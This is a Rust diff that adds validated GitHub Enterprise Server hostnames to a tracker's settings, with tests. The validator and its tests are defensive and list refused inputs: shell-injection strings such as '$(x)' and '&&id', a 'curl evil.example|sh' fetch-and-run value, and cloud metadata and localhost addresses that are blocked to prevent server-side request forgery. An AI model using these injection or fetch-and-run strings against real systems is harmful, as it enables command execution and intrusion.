@@ -118,6 +118,12 @@ pub struct TrackerSettings {
     /// loopback, private or link-local address (refused by default: SSRF).
     #[serde(default, skip_serializing_if = "std::ops::Not::not")]
     pub allow_private_network: bool,
+    /// GitHub Enterprise Server (work graph M11.4): the instance's host name,
+    /// optionally with a port (`ghe.corp.example`, `ghe.corp.example:8443`),
+    /// passed to `gh --hostname`. Unset: github.com. Admin-set and fenced by
+    /// [`validate_ghes_hostname`]; its host part is always the site URL's.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub hostname: Option<String>,
 }
 
 impl TrackerSettings {
@@ -359,23 +365,149 @@ fn github_name(s: &str) -> bool {
 
 /// `https://github.com` (every repository the `gh` login sees) or
 /// `https://github.com/<owner>` — a pasted repository or issue URL narrows
-/// to its owner. Lower case.
+/// to its owner. Lower case. A GitHub Enterprise Server site (M11.4) is the
+/// same shape on its own host, `https://<ghes host>[/<owner>]`, the host
+/// fenced by [`ghes_host_ok`]; its port, if any, lives in
+/// `settings.hostname`, never in the site.
 fn normalize_github_site(raw: &str) -> Result<String, IpcError> {
     let invalid = |why: &str| {
         IpcError::new(
             codes::E_INVALID,
-            format!("{why}: a GitHub tracker is https://github.com or https://github.com/<owner>"),
+            format!(
+                "{why}: a GitHub tracker is https://github.com[/<owner>], or \
+                 https://<enterprise host>[/<owner>]"
+            ),
         )
     };
     let (host, segs) = split_https(raw).map_err(invalid)?;
-    if host != "github.com" && host != "www.github.com" {
-        return Err(invalid("not github.com"));
-    }
+    let base = if host == "github.com" || host == "www.github.com" {
+        "https://github.com".to_string()
+    } else if ghes_host_ok(&host) {
+        format!("https://{host}")
+    } else {
+        return Err(invalid("not github.com or a GitHub Enterprise host name"));
+    };
     match segs.first() {
-        None => Ok("https://github.com".into()),
-        Some(o) if github_name(o) => Ok(format!("https://github.com/{}", o.to_ascii_lowercase())),
+        None => Ok(base),
+        Some(o) if github_name(o) => Ok(format!("{base}/{}", o.to_ascii_lowercase())),
         Some(_) => Err(invalid("not an owner name")),
     }
+}
+
+/// A GitHub tracker's site: `(enterprise host, owner)`. The host is `None`
+/// for github.com; the owner `None` for a whole-instance tracker. `None`
+/// when `site_url` is not a GitHub site.
+pub fn github_site(site_url: &str) -> Option<(Option<String>, Option<String>)> {
+    let (host, segs) = split_https(site_url).ok()?;
+    let host = match host.as_str() {
+        "github.com" | "www.github.com" => None,
+        h if ghes_host_ok(h) => Some(h.to_string()),
+        _ => return None,
+    };
+    let owner = segs
+        .first()
+        .filter(|o| github_name(o))
+        .map(|o| o.to_ascii_lowercase());
+    Some((host, owner))
+}
+
+/// Host names an enterprise hostname may never be: github.com itself (a
+/// tracker without `hostname` is github.com), and names that mean this
+/// machine or a cloud metadata service.
+const GHES_REFUSED_HOSTS: &[&str] = &[
+    "github.com",
+    "www.github.com",
+    "api.github.com",
+    "metadata.google.internal",
+];
+
+/// The host part of a GitHub Enterprise hostname (M11.4): a DNS name of at
+/// least two labels, lower case, each label 1-63 of `[a-z0-9-]` not starting
+/// or ending with a dash, at most 253 bytes; the last label is not all
+/// digits (so no IPv4 literal — loopback, link-local and metadata addresses
+/// included — can pass; an IPv6 literal has no allowed shape at all); not
+/// `localhost` or under it; not github.com, a name that dresses up as it
+/// (`github.com.evil.example`, `x.github.com`), or a metadata service name.
+pub fn ghes_host_ok(host: &str) -> bool {
+    let labels: Vec<&str> = host.split('.').collect();
+    let label_ok = |l: &&str| {
+        !l.is_empty()
+            && l.len() <= 63
+            && !l.starts_with('-')
+            && !l.ends_with('-')
+            && l.bytes()
+                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+    };
+    host.len() <= 253
+        && labels.len() >= 2
+        && labels.iter().all(label_ok)
+        && !labels
+            .last()
+            .is_some_and(|l| l.bytes().all(|b| b.is_ascii_digit()))
+        && host != "localhost"
+        && !host.ends_with(".localhost")
+        && !GHES_REFUSED_HOSTS.contains(&host)
+        && !host.starts_with("github.com.")
+        && !host.ends_with(".github.com")
+        && !host.contains(".github.com.")
+}
+
+/// A GitHub Enterprise Server hostname as an admin sets it (work graph
+/// M11.4): `<host>[:<port>]`, lower-cased, the host [`ghes_host_ok`] and the
+/// port 1-65535. Refused: a scheme, a path, userinfo, whitespace or any
+/// other character a host name cannot have (so `a;b`, `$(x)`, a space or a
+/// newline never reach the `gh --hostname` argument), an IP literal, and
+/// `localhost`.
+///
+/// Fleet never connects to this host itself: `gh` on the tracker's
+/// `via_cli` host does, with that host's own login and resolver, so there is
+/// no connect-time address check here to make (unlike Jira Data Center's
+/// resolve-then-refuse in `net::https`). The fence is the name, and it is
+/// master-only to set.
+pub fn validate_ghes_hostname(raw: &str) -> Result<String, IpcError> {
+    let invalid = |why: &str| {
+        IpcError::new(
+            codes::E_INVALID,
+            format!(
+                "hostname {why}: a GitHub Enterprise hostname is a DNS name, optionally \
+                 with :port (ghe.example.com), without a scheme, path, credentials or \
+                 IP address"
+            ),
+        )
+    };
+    if raw.is_empty() || raw.len() > 259 {
+        return Err(invalid("is empty or too long"));
+    }
+    if !raw
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'))
+    {
+        return Err(invalid("has a character a host name cannot have"));
+    }
+    let lower = raw.to_ascii_lowercase();
+    let (host, port) = match lower.split_once(':') {
+        Some((h, p)) => (h, Some(p)),
+        None => (lower.as_str(), None),
+    };
+    if let Some(p) = port {
+        let ok = !p.is_empty()
+            && p.len() <= 5
+            && !p.starts_with('0')
+            && p.bytes().all(|b| b.is_ascii_digit())
+            && p.parse::<u32>().is_ok_and(|n| (1..=65_535).contains(&n));
+        if !ok {
+            return Err(invalid("has a port that is not 1-65535"));
+        }
+    }
+    if !ghes_host_ok(host) {
+        return Err(invalid("is not an enterprise DNS host name"));
+    }
+    Ok(lower)
+}
+
+/// The host part of a validated [`validate_ghes_hostname`] value.
+pub fn ghes_host_part(hostname: &str) -> &str {
+    hostname.split(':').next().unwrap_or(hostname)
 }
 
 /// `https://app.asana.com`, or `https://app.asana.com/<workspace gid>` —
@@ -556,6 +688,14 @@ pub fn validate_tracker_settings(
         return Err(bad(
             "extra_ca and allow_private_network are Jira Data Center settings".into(),
         ));
+    }
+    if let Some(h) = &s.hostname {
+        if provider != "github" {
+            return Err(bad(
+                "hostname is a GitHub (Enterprise Server) setting".into()
+            ));
+        }
+        s.hostname = Some(validate_ghes_hostname(h)?);
     }
     if let Some(pem) = &s.extra_ca {
         if pem.len() > EXTRA_CA_MAX_BYTES || !pem.contains("-----BEGIN CERTIFICATE-----") {
@@ -1278,6 +1418,177 @@ mod tests {
             .add_tracker("jira", "Acme", "https://acme.atlassian.net/")
             .unwrap();
         (s, t.id)
+    }
+
+    /// The GitHub Enterprise hostname fence (M11.4): what reaches `gh
+    /// --hostname`, and what never does.
+    #[test]
+    fn an_enterprise_hostname_is_a_dns_name_and_nothing_else() {
+        for (raw, want) in [
+            ("ghe.corp.example", "ghe.corp.example"),
+            ("GHE.Corp.Example", "ghe.corp.example"),
+            ("ghe.corp.example:8443", "ghe.corp.example:8443"),
+            ("git-hub.x1.example", "git-hub.x1.example"),
+            ("ghe.corp.example:65535", "ghe.corp.example:65535"),
+        ] {
+            assert_eq!(validate_ghes_hostname(raw).unwrap(), want, "{raw}");
+        }
+        for bad in [
+            "",
+            " ghe.corp.example",
+            "ghe.corp.example ",
+            "ghe corp.example",
+            "ghe.corp.example\n",
+            "ghe.corp.example\nid",
+            "ghe.corp.example\r",
+            "ghe.corp.example\0",
+            "a;b",
+            "a;b.example",
+            "$(x)",
+            "$(x).example",
+            "`id`.example",
+            "ghe.example&&id",
+            "ghe.example|id",
+            "ghe.example'",
+            "ghe.example\"",
+            "https://ghe.corp.example",
+            "ghe.corp.example/api",
+            "user@ghe.corp.example",
+            "user:pw@ghe.corp.example",
+            "ghe.corp.example:",
+            "ghe.corp.example:0",
+            "ghe.corp.example:08443",
+            "ghe.corp.example:65536",
+            "ghe.corp.example:84:43",
+            "ghe.corp.example:x",
+            "localhost",
+            "LOCALHOST",
+            "localhost:8443",
+            "api.localhost",
+            "ghe",
+            "127.0.0.1",
+            "127.0.0.1:443",
+            "169.254.169.254",
+            "10.0.0.8",
+            "0.0.0.0",
+            "[::1]",
+            "::1",
+            "fe80::1",
+            "metadata.google.internal",
+            "github.com",
+            "www.github.com",
+            "api.github.com",
+            "github.com.evil.example",
+            "x.github.com",
+            "a.github.com.evil.example",
+            "-ghe.example",
+            "ghe-.example",
+            "ghe..example",
+            ".ghe.example",
+            "ghe.example.",
+            "ghe_corp.example",
+            "gh\u{e9}.example",
+            "--hostname.example",
+        ] {
+            let e = validate_ghes_hostname(bad).unwrap_err();
+            assert_eq!(e.code, codes::E_INVALID, "{bad:?}");
+        }
+        assert!(validate_ghes_hostname(&format!("{}.example", "a".repeat(64))).is_err());
+        assert!(validate_ghes_hostname(&"a.".repeat(130)).is_err());
+    }
+
+    #[test]
+    fn a_github_site_may_be_an_enterprise_host_and_the_hostname_is_github_only() {
+        for (raw, want) in [
+            (
+                "https://github.com/Acme/api/issues/4",
+                "https://github.com/acme",
+            ),
+            ("https://ghe.corp.example", "https://ghe.corp.example"),
+            (
+                "https://GHE.corp.example/Acme/api/issues/4",
+                "https://ghe.corp.example/acme",
+            ),
+        ] {
+            assert_eq!(
+                normalize_provider_site("github", raw).unwrap(),
+                want,
+                "{raw}"
+            );
+        }
+        for bad in [
+            "https://ghe.corp.example:8443/acme",
+            "https://127.0.0.1/acme",
+            "https://localhost/acme",
+            "https://u@ghe.corp.example/acme",
+            "http://ghe.corp.example/acme",
+            "https://ghe/acme",
+            "https://ghe.corp.example/-x",
+        ] {
+            assert!(normalize_provider_site("github", bad).is_err(), "{bad}");
+        }
+        assert_eq!(
+            github_site("https://ghe.corp.example/acme"),
+            Some((Some("ghe.corp.example".into()), Some("acme".into())))
+        );
+        assert_eq!(github_site("https://github.com"), Some((None, None)));
+        assert_eq!(github_site("https://localhost/acme"), None);
+        assert_eq!(github_site("http://ghe.corp.example"), None);
+        let with_host = TrackerSettings {
+            hostname: Some("GHE.corp.example:8443".into()),
+            ..Default::default()
+        };
+        assert_eq!(
+            validate_tracker_settings("github", with_host.clone())
+                .unwrap()
+                .hostname
+                .as_deref(),
+            Some("ghe.corp.example:8443")
+        );
+        for p in ["jira", "jira_dc", "asana", "linear"] {
+            assert!(
+                validate_tracker_settings(p, with_host.clone()).is_err(),
+                "{p}"
+            );
+        }
+        let bad = TrackerSettings {
+            hostname: Some("$(curl evil.example|sh)".into()),
+            ..Default::default()
+        };
+        assert!(validate_tracker_settings("github", bad).is_err());
+    }
+
+    #[test]
+    fn a_github_ref_may_name_an_enterprise_instance() {
+        use crate::store::{canonical_key, github_ref, split_github_repo};
+        assert_eq!(github_ref("acme/api#42"), Some(("acme/api", 42)));
+        assert_eq!(
+            github_ref("ghe.corp.example/acme/api#42"),
+            Some(("ghe.corp.example/acme/api", 42))
+        );
+        assert_eq!(
+            split_github_repo("ghe.corp.example/acme/api"),
+            Some((Some("ghe.corp.example"), "acme/api"))
+        );
+        assert_eq!(split_github_repo("acme/api"), Some((None, "acme/api")));
+        for bad in [
+            "localhost/acme/api#1",
+            "127.0.0.1/acme/api#1",
+            "ghe.corp.example:8443/acme/api#1",
+            "a/b/c/d#1",
+            "ghe.corp.example/.x/api#1",
+            "ghe.corp.example/acme/api#",
+            "ghe.corp.example/acme/api#1234567890",
+        ] {
+            assert_eq!(github_ref(bad), None, "{bad}");
+        }
+        assert_eq!(
+            canonical_key("GHE.Corp.Example/Acme/API#7"),
+            "ghe.corp.example/acme/api#7"
+        );
+        assert!(crate::service::work::recognize::is_work_key(
+            "ghe.corp.example/acme/api#7"
+        ));
     }
 
     #[test]
